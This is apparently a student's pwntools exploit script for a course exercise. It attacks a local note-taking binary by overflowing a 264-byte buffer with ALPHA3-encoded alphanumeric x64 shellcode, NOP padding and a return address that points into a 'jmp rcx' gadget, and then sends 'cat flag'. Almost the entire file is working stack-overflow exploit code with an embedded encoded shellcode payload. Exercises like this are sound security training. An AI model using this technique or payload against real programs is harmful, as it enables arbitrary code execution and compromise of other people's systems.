#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6b'

elf = ELF(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

"""
referencing
https://www.twblogs.net/a/5efa4384293416316957df0a#google_vignette
https://github.com/TaQini/alpha3
python ./ALPHA3.py x64 ascii mixedcase rcx --input="shellcode"
"""

jump_target = elf.symbols['reverse_buffer']
jump_target = jump_target + 8  # jump rcx command in here

print(hex(jump_target))

shellcode = b"Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

command = b'a' * 2 + shellcode + (264 - len(shellcode) - 2) * b'\x90' + p64(jump_target)
print(r.recvuntil(b'Enter 1 to add a new note or 2 to show all notes:\n'))
r.sendline(b"1")
print(r.recvuntil(b'Enter your note:\n'))
r.sendline(command)
r.sendline(b'cat flag')
print(r.recvall(timeout=3))